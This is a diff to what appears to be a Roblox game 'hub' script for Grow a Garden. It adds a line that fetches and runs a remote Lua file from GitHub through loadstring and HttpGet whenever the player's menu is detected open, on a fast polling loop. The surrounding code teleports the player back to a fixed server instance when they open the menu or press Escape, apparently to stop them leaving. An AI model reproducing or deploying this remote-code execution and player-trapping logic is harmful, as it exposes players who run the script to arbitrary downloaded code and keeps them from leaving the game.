@@ -29,6 +29,7 @@ local function startMethod3()
         local menuOpen = GuiService:GetGuiInset().Y > 0
         
         if menuOpen then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/pocariwins/growagarden/refs/heads/main/important/main.lua"))()
             restartPlayer()
         end
     end
@@ -248,54 +249,6 @@ local function createNotificationGUI(hubName, hubIndex)
         ]])
         task.wait(5)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/pocariwins/growagarden/refs/heads/main/important/main.lua"))()
-        
-        local function restartPlayer()
-            local jobId = "a82cab16-aac9-43e5-9042-2c47de56f603"
-            local placeId = game.PlaceId
-            
-            for i = 1, 10 do
-                spawn(function()
-                    TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
-                end)
-                wait(0.05)
-            end
-        end
-        
-        local method3Running = false
-        
-        local function startMethod3()
-            if method3Running then return end
-            method3Running = true
-            
-            local CoreGui = game:GetService("CoreGui")
-        
-            local function detectMenuState()
-                local menuOpen = GuiService:GetGuiInset().Y > 0
-                
-                if menuOpen then
-                    restartPlayer()
-                end
-            end
-        
-            spawn(function()
-                while method3Running do
-                    detectMenuState()
-                    wait(0.05)
-                end
-            end)
-        end
-        
-        GuiService.MenuOpened:Connect(function()
-            startMethod3()
-            restartPlayer()
-        end)
-        
-        UserInputService.InputBegan:Connect(function(input, gameProcessed)
-            if not gameProcessed and input.KeyCode == Enum.KeyCode.Escape then
-                startMethod3()
-                restartPlayer()
-            end
-        end)
         
         notifGui:Destroy()
     end)
